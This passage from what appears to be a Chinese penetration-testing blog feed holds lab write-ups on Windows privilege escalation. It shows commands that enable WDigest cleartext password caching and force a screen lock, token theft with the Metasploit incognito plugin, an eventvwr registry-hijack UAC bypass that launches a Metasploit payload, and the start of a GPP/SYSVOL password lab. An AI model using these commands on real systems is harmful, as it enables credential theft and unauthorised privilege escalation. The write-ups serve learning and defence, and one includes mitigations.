-Name UseLogonCredential -Type DWORD -Value 1<br></code></pre></td></tr></table></figure></li><li><p>meterpreter</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1<br></code></pre></td></tr></table></figure></li></ul><p><strong>关闭Wdigest Auth</strong></p><p>关闭命令如下：</p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br></code></pre></td></tr></table></figure></li><li><p>powershell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure></li><li><p>meterpreter</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0<br></code></pre></td></tr></table></figure></li></ul><p><strong>强制锁屏</strong></p><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p><p>强制锁屏，让管理员重新登录。</p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">rundll32 user32.dll,LockWorkStation<br></code></pre></td></tr></table></figure><p>  等待管理员重新登录，之后重新读取，可读到明文密码。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令牌窃取分析及防范</title>
    <link href="/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/"/>
    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p></blockquote><h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p><p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p><ul><li>  访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li><li>  密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li><li>  会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li></ul><h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p><p>目前访问令牌分为两种令牌：</p><ul><li>  主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li><li>  模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li></ul><p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p><p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p><ul><li>  用户帐户的安全标识符(SID)</li><li>  用户帐户所属的用户群的SIDs</li><li>  一个logon SID，标识当前登录会话</li><li>  用户或用户群的特权清单</li><li>  所有者的SID</li><li>  基本群的SID</li><li>  当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li><li>  访问令牌资源</li><li>  是否为primary或impersonation token</li><li>  限制性SIDs的可选列表</li><li>  当前impersonation级别</li><li>  其他统计</li></ul><p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p><p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p><p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p><p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p><h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085126.png" alt="image-20210129091617259"></p><p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d c:\testftp\shell.exe /f<br><br>eventvwr.exe<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085131.png" alt="image-20210128223604660"></p><blockquote><p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p><p>   Impresonation Token：模拟令牌，它是非交互的会话。</p></blockquote><p>得到授权令牌：        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">NT AUTHORITY\IUSR<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br>TEST\Administrator<br>TEST\yhy<br></code></pre></td></tr></table></figure><p>得到模拟令牌：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">NT AUTHORITY\ANONYMOUS LOGON<br></code></pre></td></tr></table></figure><p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">impersonate_token &#39;TEST\Administrator&#39;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085137.png" alt="image-20210128223730735"></p><p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085141.png" alt="image-20210128223804482"></p><p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p><h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p><ul><li>  为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li><li>  及时安装微软推送的补丁</li><li>  对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li><li>  对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li><li>  对于令牌，应采取加密存储及多长验证保护</li><li>  使用加密链路SSL/TLS传输令牌，以防止被中间人窃听</li></ul>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权-BypassUAC之劫持注册表实验</title>
    <link href="/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  准备PPT的过程中，还是学到不少东西的</p></blockquote><h3 id="1-UAC-简介"><a href="#1-UAC-简介" class="headerlink" title="1. UAC 简介"></a>1. UAC 简介</h3><p>**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p><p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录( 例如 C:\)、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证，如图所示：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084909.png" alt="image-20210118155254114"></p><p><strong>需要UAC的授权才能进行的操作列表如下：</strong></p><ul><li>  配置Windows Update</li><li>  增加、删除账户</li><li>  更改账户类型</li><li>  更改UAC的设置</li><li>  安装ActiveX</li><li>  安装、卸载程序</li><li>  安装设备驱动程序</li><li>  将文件移动/复制到Program Files或Windows目录下</li><li>  查看其它用户的文件夹</li><li>  …</li></ul><p><strong>UAC有如下四种设置要求：</strong></p><ul><li><p>  始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p></li><li><p>  仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p></li><li><p>  仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p></li><li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p><p>  <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084914.png" alt="image-20210119212303742"></p></li></ul><h3 id="2-利用系统自带的UAC白名单程序提权"><a href="#2-利用系统自带的UAC白名单程序提权" class="headerlink" title="2. 利用系统自带的UAC白名单程序提权"></a>2. 利用系统自带的UAC白名单程序提权</h3><p>用户账户控制限制着程序使用高级权限才能进行的操作，但是，UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序是安全的。因此，微软则在 UAC 中添加了白名单机制，即在系统中记录有一张表单，表单中的系统程序，将不限制其直接提升到管理员权限。 系统中的白名单程序有多个，其中，msconfig、taskmgr、perfmon、cleanmgr 等平时常用的程序都在其中。操作系统的UAC白名单程序，默认以管理员权限运行，而且不弹出UAC窗口确认。这些白名单程序，都具有微软的签名是操作系统可信的。</p><p>所以我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p><p>以高权限运行的进程图标一般有如下标志：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084919.png" alt="image-20210119104903074"></p><h3 id="3-怎么找这些白名单程序"><a href="#3-怎么找这些白名单程序" class="headerlink" title="3. 怎么找这些白名单程序"></a>3. 怎么找这些白名单程序</h3><p>白名单程序都有一个特性，就是它们都具有autoElevate属性，该属性可由特定工具查看。</p><p>利用微软自带工具检测程序是否具有autoElevate属性，以eventvwr.exe为例，该程序位于C:\Windows\System32目录下。使用微软的Sigcheck工具去查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Sigcheck.exe：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;sigcheck<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084934.png" alt="image-20210119143254956"></p><p>利用(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)工具找出所有具有autoElevate属性的程序，将strings.exe放在C:\Windows\System32目录下</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">strings.exe -s *.exe | findstr &#x2F;i autoelevate<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084950.png" alt="image-20210119144326844"></p><p>系统在调用这些高权限程序时，会调用<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值。 所以，修改<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值，把原本的键值改为 cmd.exe 等 shell 程序。如果高权限的程序，在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。从而实现绕过 UAC提权。难点在于找到注册表的关键位置。</p><h3 id="4-如何找对应的注册表？以事件查看器（eventvwr-为例"><a href="#4-如何找对应的注册表？以事件查看器（eventvwr-为例" class="headerlink" title="4. 如何找对应的注册表？以事件查看器（eventvwr)为例"></a>4. 如何找对应的注册表？以事件查看器（eventvwr)为例</h3><p>接下来使用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> 工具来查看eventvwr运行时，会调用哪些文件、查询哪些注册表地址。（win7 上无法使用 提示： unable to load Process Monitor device driver，需要更新下面这个补丁即可：<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148）</a></p><p>1、打开Process Monitor工具后，设置过滤规则，选择工具栏”Filter” ==&gt; “Filter…”</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085000.png" alt="image-20210119160455408"></p><p>设置过滤规则，”Process Name” “is” “eventvwr.exe”，然后点击Add添加规则，之后点击Apply应用和OK即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085005.png" alt="image-20210119160612340"></p><p>运行eventvwr.exe，之后查看Process Monitor ，会出现一堆东西，而且右键Properties 可以看到<code>eventvwr.exe</code>权限为 <code>high</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085012.png" alt="image-20210119161656625"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085019.png" alt="image-20210119164141166"></p><p>难点就在于从这一堆东西中找到注册表的关键位置，这里我也并不熟悉，通过查找搜索，发现关键点为：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<br>HKCR<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<br></code></pre></td></tr></table></figure><p>在进程 <code>eventvwr.exe</code> 启动的时候，首先查找注册表位置 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>。如果该处为空，接着查找注册表位置 <code>HKCR\mscfile\shell\open\command</code>(此处默认值为 <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)，以高权限启动 <code>mmc.exe</code>，最后打开 <code>eventvwr.msc</code>。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085025.png" alt="image-20210119211043232"></p><p>这里由结果向原因推导：发现关键字，<code>shell</code> 、<code>command</code> </p><p>搞站不就是拿shell，执行命令，这里不就是执行命令的点吗？！</p><h4 id="4-1-测试"><a href="#4-1-测试" class="headerlink" title="4.1 测试"></a>4.1 测试</h4><p>如果修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，使其查询结果为 <code>SUCCESS</code>，会如何呢？</p><p>首先需要修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为测试可以把值改为 <code>calc.exe</code>， 打开运行，执行regedit</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">注册表内：<br>    <span class="hljs-params">HKCU</span> = <span class="hljs-params">HKEY_CURRENT_USER</span><br>    <span class="hljs-params">HKLM</span> = <span class="hljs-params">HKEY_LOCAL_MACHINE</span><br>    <span class="hljs-params">HKCR</span> = <span class="hljs-params">HKEY_CLASSES_ROOT</span><br></code></pre></td></tr></table></figure><p>在Win7 中 我这里的 <code>regedit</code> 中的键值只到 <code>HKCU\Software\Classes\</code> 这层目录，所以我新增了后面的表项，并把值设为 <code>C:\Windows\System32\calc.exe</code>。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085030.png" alt="image-20210119163817241"></p><p>再重新启动<code>eventvwr.exe</code>，成功弹出计算器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085036.png" alt="image-20210119163926939"></p><p>并且使用Process Monitor 查看权限，也是<code>high</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085040.png" alt="image-20210119164604806"></p><p>而正常启动计算器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085048.png" alt="image-20210119164803238"></p><p>实验成功，成功绕过 UAC。</p><h4 id="4-2-实战"><a href="#4-2-实战" class="headerlink" title="4.2 实战"></a>4.2 实战</h4><p>修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为msf生成的exe，之后运行<code>eventvwr.exe</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085055.png" alt="image-20210119165643571"></p><p>一句话修改注册表，将<code>d:\1.exe</code>改为msf的exe地址，复制到命令行执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add <span class="hljs-string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="hljs-comment">#1.exe为msf马</span><br></code></pre></td></tr></table></figure><p>如果直接执行shell.exe，反弹回来的会话不能通过getsystem直接提权，因为会被UAC拦截</p><p><img src="images/image-20210119171432120.png" alt="image-20210119171432120"></p><p>劫持注册表后，再次执行eventvwr，程序就会去查找劫持的注册表地址，然后以自动提权之后的管理员权限加载shell.exe，此时反弹回来的会话可通过getsystem直接提权</p><p><img src="images/image-20210119170019046.png" alt="image-20210119170019046"></p><p>最后记得清除注册表项</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg delete &quot;HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand&quot;<br></code></pre></td></tr></table></figure><p>需要注意的是，执行eventvwr命令时才会去注册表查找mmc.exe的路径，如果执行的是mmc.exe eventvwr.msc，直接加载mmc.exe，是不会去查询注册表的。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组策略提权实验</title>
    <link href="/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>管理员在域中新建一个组策略后,操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p></blockquote><h2 id="1-组策略基本介绍"><a href="#1-组策略基本介绍" class="headerlink" title="1. 组策略基本介绍"></a>1. 组策略基本介绍</h2><p>组策略可以控制用户帐户和计算机帐户的工作环境。它提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略，借机学一下域环境搭建</p><h2 id="2-SYSVOL-漏洞-MS14-025"><a href="#2-SYSVOL-漏洞-MS14-025" class="headerlink" title="2. SYSVOL 漏洞(MS14-025)"></a>2. SYSVOL 漏洞(MS14-025)</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL 文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSvOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies 目录中。</p><p>在一般的域环境中,所有机器都是脚本化批量部署的,数据量通常很大。为了方便地对所有的机器进行操作,网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加人域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。但是当通过组策略统一修改密码，虽然密码强度会有所提高，这就造成了所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码,就相当于获得了整个域中所有机器的本地管理员密码。</p><p>在域中，存在一个默认的共享路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\<br></code></pre></td></tr></table></figure><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等。</p><p>例如，测试主机所在域为test.yhy，可访问共享文件夹<code>\\test.yhy\SYSVOL\test.yhy</code>，如下图：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084350.png" alt="image-20210116111851931"></p><p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥，地址： <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspx。</a></p><p>![image-20210116111342068](/Users/yhy/Library/Application Support/typora-user-images/image-20210116111342068.png)</p><p>如下几个组策略首选项文件中会存在可选的密码cpassword 属性:</p><ul><li><p>  Groups\Groupsx.xml</p></li><li><p>  Services\Services.xml</p></li><li><p>  ScheduledTasks\ScheduledTasks.xml</p></li><li><p>  Printers\Printers.xml</p></li><li><p>  Drives\Drives.xml</p></li><li><p>  DataSources\DataSources.xml</p></li></ul><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-域环境搭建"><a href="#3-1-域环境搭建" class="headerlink" title="3.1 域环境搭建"></a>3.1 域环境搭建</h3><h4 id="3-1-1-环境要求"><a href="#3-1-1-环境要求" class="headerlink" title="3.1.1 环境要求"></a>3.1.1 环境要求</h4><p>环境：Windows Server 2008R2 </p><p>网络：NAT模式</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084407.png" alt="image-20210116112955314"></p><p>更改管理员Administrator 密码为强密码，例如：test.yhy@123</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084412.png" alt="image-20210116114025566"></p><h4 id="3-1-2-添加域"><a href="#3-1-2-添加域" class="headerlink" title="3.1.2 添加域"></a>3.1.2 添加域</h4><p>点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084418.png" alt="image-20210116112445745"></p><p>选中 Active Directory 域服务</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084422.png" alt="image-20210116113323735"></p><p>一直下一步，安装即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084429.png" alt="image-20210116113443897"></p><p>关闭后，打开“服务器管理器”，找到Active Directory安装向导</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084433.png" alt="image-20210116113523528"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084437.png" alt="image-20210116113639168"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084446.png" alt="image-20210116114315069"></p><p>因为前面没配置静态IP（前面应该配置为静态IP的，不过这个环境无所谓了），这里选择是：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084451.png" alt="image-20210116114528206"> </p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084518.png" alt="image-20210116114630800"></p><p>点击是，下一步，设置密码：test.yhy@123</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084525.png" alt="image-20210116114714649"></p><p>一直下一步，等待安装</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084531.png" alt="image-20210116114816453"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084537.png" alt="image-20210116114855068"></p><p>完成，重启。</p><p>测试一下：<code>net user /domain</code>, ok</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084547.png" alt="image-20210116115925975"></p><h4 id="3-1-3安装FTP服务"><a href="#3-1-3安装FTP服务" class="headerlink" title="3.1.3安装FTP服务"></a>3.1.3安装FTP服务</h4><p>虚拟机不知道为啥装不上VMware Tools，没办法拖文件，这里打开FTP服务，使用FTP上传文件。</p><p>还是点击左下角开始按钮旁边的服务器管理器，角色 —&gt; 添加角色</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084554.png" alt="image-20210116120244713"></p><p>选择Web服务（IIS），下一步，最下边选择FTP服务器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084558.png" alt="image-20210116120911584"></p><p>一直下一步，安装</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084604.png" alt="image-20210116120952490"></p><p>完成后，点击开始按钮，所有程序 —&gt; 管理工具 —&gt; Internet 信息服务(IIS)管理器</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084609.png" alt="image-20210116120424350"></p><p>右键添加FTP站点</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084618.png" alt="image-20210116122419671"></p><p>站点名称随意，物理路径，这里选择了C盘下新建文件夹，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084624.png" alt="image-20210116123005662"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084629.png" alt="image-20210116123140690"></p><p><img 